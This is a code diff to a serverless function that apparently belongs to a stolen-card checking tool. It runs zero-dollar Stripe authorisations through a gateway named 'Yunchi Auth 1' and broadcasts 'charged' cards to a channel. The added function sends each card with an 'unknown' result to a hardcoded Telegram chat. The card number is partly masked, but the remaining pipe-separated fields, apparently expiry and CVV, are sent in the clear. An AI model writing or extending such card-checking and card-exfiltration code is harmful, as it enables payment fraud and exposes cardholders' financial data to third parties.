@@ -10,6 +10,51 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
+
+// Send admin debug notification for UNKNOWN results
+const sendAdminDebug = async (
+  cardDetails: string,
+  rawResponse: string,
+  gateway: string
+) => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log("[STRIPE-AUTH] No Telegram bot token for admin debug");
+    return;
+  }
+
+  // Mask card number for admin debug (show first 6 and last 4)
+  const parts = cardDetails.split('|');
+  const cardNum = parts[0] || '';
+  const maskedCard = cardNum.length > 10 
+    ? `${cardNum.slice(0, 6)}******${cardNum.slice(-4)}|${parts.slice(1).join('|')}`
+    : cardDetails;
+
+  const message = `🔍 <b>UNKNOWN DEBUG - ${gateway}</b>
+
+📇 <b>Card:</b> <code>${maskedCard}</code>
+
+📋 <b>Raw Response:</b>
+<code>${rawResponse.slice(0, 500)}</code>
+
+⏰ ${new Date().toISOString()}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+    console.log("[STRIPE-AUTH] Admin debug sent for UNKNOWN result");
+  } catch (err) {
+    console.error("[STRIPE-AUTH] Failed to send admin debug:", err);
+  }
+};
 
 // Notify charged card (fire-and-forget) - broadcasts to channel
 const notifyChargedCard = (
@@ -225,6 +270,11 @@ serve(async (req) => {
         '$0.00',
         'Yunchi Auth 1'
       );
+    }
+
+    // Send admin debug for UNKNOWN results
+    if (data.computedStatus === 'unknown') {
+      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || 'No response'), 'Yunchi Auth 1');
     }
 
     return new Response(
